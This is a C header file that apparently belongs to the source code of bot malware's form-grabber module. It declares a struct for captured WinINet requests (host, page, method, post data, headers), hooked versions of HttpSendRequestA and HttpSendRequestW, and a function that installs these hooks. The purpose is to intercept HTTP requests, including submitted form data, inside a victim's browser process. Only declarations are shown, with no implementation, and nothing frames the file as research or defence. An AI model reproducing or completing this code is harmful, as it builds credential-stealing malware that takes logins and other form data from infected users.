#pragma once
#include "modules.h"

#ifdef MODULE_FORMGRABBER
#include "../common/bot_structs.h"

typedef struct  
{
	HINTERNET hConnect, hRequest;

	LPSTR Host;
	LPSTR Page; 
	LPSTR Method;

	LPSTR Data, Header;
}wininet_request_t;

BOOL WINAPI HttpSendRequestW_Hooked(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength,LPVOID lpOptional,DWORD dwOptionalLength);
BOOL WINAPI HttpSendRequestA_Hooked(_In_ HINTERNET hRequest,LPCSTR lpszHeaders,DWORD dwHeadersLength,LPVOID lpOptional,DWORD dwOptionalLength);

BOOL WINAPI IsWininet(HMODULE* phMod);
BOOL WINAPI InstallWininetHooks(void);
#endif